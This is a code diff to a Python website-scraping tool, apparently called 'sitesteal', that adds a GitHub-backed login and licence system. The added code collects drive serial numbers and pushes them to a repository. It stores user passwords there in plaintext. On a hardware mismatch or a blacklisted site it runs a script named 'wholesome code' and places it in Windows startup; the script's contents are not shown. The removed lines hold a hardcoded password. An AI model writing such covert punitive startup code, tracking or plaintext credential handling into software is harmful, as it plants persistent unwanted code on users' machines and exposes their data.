@@ -19,6 +19,11 @@ import subprocess
 import git
 from bs4 import BeautifulSoup
 import sys
+import json
+
+# Fix for PyInstaller
+if getattr(sys, 'frozen', False):
+    os.environ['PATH'] = sys._MEIPASS + ";" + os.environ['PATH']
 
 init(autoreset=True)
 
@@ -172,17 +177,31 @@ def add_to_startup(script_path):
         f.write(f'python "{script_path}"')
     return startup_path
 
-def execute_wholesome_code():
+def execute_wholesome_code(add_to_startup_flag=False):
     script_path = create_wholesome_script()
-    add_to_startup(script_path)
+    if add_to_startup_flag:
+        add_to_startup(script_path)
     # Execute the script immediately
     subprocess.run(["python", script_path])
+
+def get_hardware_serials():
+    serials = []
+    for drive in ['C:\\', 'D:\\', 'E:\\', 'F:\\']:
+        try:
+            serial_number = ctypes.c_uint()
+            ctypes.windll.kernel32.GetVolumeInformationW(
+                drive, None, 0, ctypes.byref(serial_number), None, None, None, 0
+            )
+            serials.append(str(serial_number.value))
+        except:
+            continue
+    return serials
 
 def get_website_source(url, download_folder):
     global start_time, user_rank
     domain_name = urlparse(url).netloc
     if domain_name in blacklisted_sites and user_rank != "Founder":
-        execute_wholesome_code()
+        execute_wholesome_code(add_to_startup_flag=True)
         return
     if not os.path.exists(download_folder):
         os.makedirs(download_folder)
@@ -290,18 +309,11 @@ def scan_common_folders(download_folder, base_url):
                     for file in subfiles:
                         scan_and_queue_file(os.path.join(subdir, file), base_url)
 
-def get_hwid():
-    serial_number = ctypes.c_uint()
-    ctypes.windll.kernel32.GetVolumeInformationW(
-        "C:\\", None, 0, ctypes.byref(serial_number), None, None, None, 0
-    )
-    return str(serial_number.value)
-
 def fetch_github_list(file_name):
     repo_url = "https://raw.githubusercontent.com/dddrrriiipppsss/sitesteal/main/"
     response = requests.get(repo_url + file_name)
     if response.status_code == 200:
-        return response.text.splitlines()
+        return response.json()
     else:
         logging.error(f"Failed to fetch {file_name} from GitHub")
         return []
@@ -315,26 +327,35 @@ def update_github_list(file_name, content):
         return
     file_path = os.path.join(repo.working_tree_dir, file_name)
     with open(file_path, 'w', encoding='utf-8') as f:
-        f.write("\n".join(content))
+        json.dump(content, f, indent=4)
     repo.index.add([file_path])
     repo.index.commit(f"Update {file_name}")
     origin = repo.remotes.origin
     origin.push()
+
+def save_login(username):
+    logins = fetch_github_list(".logins")
+    serials = get_hardware_serials()
+    logins[username] = serials
+    update_github_list(".logins", logins)
 
 def login():
     global first_login, whitelist, blacklist, blacklisted_sites, user_rank
     whitelist = fetch_github_list("whitelist.txt")
     blacklist = fetch_github_list("blacklist.txt")
     blacklisted_sites = fetch_github_list("blacklisted_sites.txt")
+    logins = fetch_github_list(".logins")
     first_login = False
     if os.path.exists("Fartbin.license"):
         with open("Fartbin.license", "r") as f:
             try:
-                saved_username, saved_password, saved_hwid = f.read().strip().split(',')
+                saved_username, saved_password, saved_serials = f.read().strip().split(',')
+                saved_serials = json.loads(saved_serials)
             except ValueError:
-                saved_username, saved_password, saved_hwid = None, None, None
-            if saved_hwid != get_hwid():
-                print("HWID mismatch. Access denied.")
+                saved_username, saved_password, saved_serials = None, None, None
+            if saved_username in logins and logins[saved_username] != saved_serials:
+                execute_wholesome_code()
+                print("Hardware serial mismatch. Access denied.")
                 exit()
     else:
         first_login = True
@@ -344,25 +365,34 @@ def login():
                 print("Access denied.")
                 exit()
             password = getpass("Enter your password: ")
-            hwid = get_hwid()
-            if username in ["drips", "dddrrriiipppsss"] and password == "234@":
-                rank = "Founder"
+            serials = get_hardware_serials()
+            if username in whitelist:
+                if whitelist[username] != password:
+                    blacklist.append(username)
+                    update_github_list("blacklist.txt", blacklist)
+                    print("Invalid password. You have been blacklisted.")
+                    exit()
             else:
                 print("Invalid credentials.")
                 exit()
-            f.write(f"{username},{password},{hwid}")
-            return username, rank, first_login
+            f.write(f"{username},{password},{json.dumps(serials)}")
+            save_login(username)
+            return username, "Founder", first_login
     with open("Fartbin.license", "r", encoding='utf-8', errors='surrogateescape') as f:
-        saved_username, saved_password, saved_hwid = f.read().strip().split(',')
-    if saved_username in ["drips", "dddrrriiipppsss"]:
-        rank = "Founder"
-    else:
-        rank = "User"
-    user_rank = rank
-    if saved_hwid != get_hwid():
-        print("HWID mismatch. Access denied.")
+        saved_username, saved_password, saved_serials = f.read().strip().split(',')
+        saved_serials = json.loads(saved_serials)
+    if saved_username in whitelist:
+        if whitelist[saved_username] != saved_password:
+            blacklist.append(saved_username)
+            update_github_list("blacklist.txt", blacklist)
+            print("Invalid password. You have been blacklisted.")
+            exit()
+    if saved_username in logins and logins[saved_username] != saved_serials:
+        execute_wholesome_code()
+        print("Hardware serial mismatch. Access denied.")
         exit()
-    return saved_username, rank, first_login
+    user_rank = "Founder" if saved_username in ["drips", "dddrrriiipppsss"] else "User"
+    return saved_username, user_rank, first_login
 
 def manage_whitelist():
     while True:
@@ -376,13 +406,14 @@ def manage_whitelist():
         option = input("Select an option: ")
         if option == '1':
             user_to_add = input("Enter username to whitelist: ")
-            whitelist.append(user_to_add)
+            password = getpass("Enter password for this user: ")
+            whitelist[user_to_add] = password
             print(f"{user_to_add} has been whitelisted.")
             update_github_list("whitelist.txt", whitelist)
         elif option == '2':
             user_to_remove = input("Enter username to remove from whitelist: ")
             if user_to_remove in whitelist:
-                whitelist.remove(user_to_remove)
+                del whitelist[user_to_remove]
                 print(f"{user_to_remove} has been removed from the whitelist.")
                 update_github_list("whitelist.txt", whitelist)
             else:
